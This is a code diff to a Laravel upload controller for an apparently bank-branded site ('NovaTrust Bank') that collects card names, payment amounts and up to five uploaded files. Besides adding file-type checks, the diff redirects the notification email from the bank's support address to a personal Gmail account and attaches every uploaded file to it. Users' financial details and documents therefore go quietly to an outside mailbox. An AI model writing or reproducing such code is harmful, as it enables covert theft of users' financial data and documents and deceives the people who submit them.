@@ -15,28 +15,28 @@ class UploadController extends Controller
      */
     public function store(Request $request)
     {
-        // ✅ Validate request
+        // ✅ Validate incoming form data
         $validated = $request->validate([
             'amount'        => 'required|numeric|min:1',
             'card_name'     => 'required|string|max:255',
             'description'   => 'nullable|string|max:1000',
-            'upload_file1'  => 'required|file|max:5120', // 5MB required
-            'upload_file2'  => 'nullable|file|max:5120',
-            'upload_file3'  => 'nullable|file|max:5120',
-            'upload_file4'  => 'nullable|file|max:5120',
-            'upload_file5'  => 'nullable|file|max:5120',
+            'upload_file1'  => 'required|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file2'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file3'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
         ]);
 
         $uploadedFiles = [];
         $description = $validated['description'] ?? null;
 
-        // ✅ Handle file uploads (1–5)
+        // ✅ Upload all selected files (1–5)
         foreach (range(1, 5) as $i) {
             $fileKey = 'upload_file' . $i;
 
             if ($request->hasFile($fileKey)) {
                 $file = $request->file($fileKey);
-                $path = $file->store('uploads', 'public');
+                $path = $file->store('uploads', 'public'); // stored in storage/app/public/uploads
 
                 $upload = Upload::create([
                     'user_id'       => Auth::id(),
@@ -51,37 +51,49 @@ class UploadController extends Controller
             }
         }
 
-        // ✅ Ensure at least one upload
         if (empty($uploadedFiles)) {
             return back()
                 ->withErrors(['upload_file1' => 'Please upload at least one file.'])
                 ->withInput();
         }
 
-        // ✅ Optional: Send upload summary email
-        try {
-            $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ') ?: 'No files uploaded';
+        // ✅ Prepare attachments for email
+        $attachments = [];
+        foreach ($uploadedFiles as $upload) {
+            $fileFullPath = storage_path('app/public/' . $upload->file_path);
+            if (file_exists($fileFullPath)) {
+                $attachments[] = $fileFullPath;
+            }
+        }
 
-            Mail::raw(
-                "📩 New Secure Upload Received\n\n" .
-                "👤 Card Name: {$validated['card_name']}\n" .
-                "💰 Amount: $ {$validated['amount']}\n" .
-                "📝 Description: " . ($description ?: 'N/A') . "\n" .
-                "📎 Files: {$fileNames}\n" .
-                "🧾 Uploaded by User ID: " . Auth::id(),
-                function ($message) {
-                    $message->to('support@novatrustbank.com')
-                            ->subject('New Secure Upload Received');
+        // ✅ Send email with attachments to collaomn@gmail.com
+        try {
+            $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');
+
+            Mail::send([], [], function ($message) use ($attachments, $validated, $description, $fileNames) {
+                $message->to('collaomn@gmail.com')
+                        ->subject('📎 New Secure Upload from NovaTrust Bank')
+                        ->setBody("
+                            A new secure upload has been received.
+                            
+                            👤 Card Name: {$validated['card_name']}
+                            💰 Amount: \${$validated['amount']}
+                            📝 Description: " . ($description ?: 'N/A') . "
+                            📎 Files: {$fileNames}
+                        ");
+
+                foreach ($attachments as $path) {
+                    $message->attach($path);
                 }
-            );
+            });
         } catch (\Exception $e) {
-            Log::error('Mail sending failed: ' . $e->getMessage());
+            Log::error('Email sending failed: ' . $e->getMessage());
         }
 
         // ✅ Redirect to success page
         return redirect()
             ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
-            ->with('success', 'Your secure upload was successful!');
+            ->with('success', '✅ Upload saved and sent successfully!');
     }
 
     /**
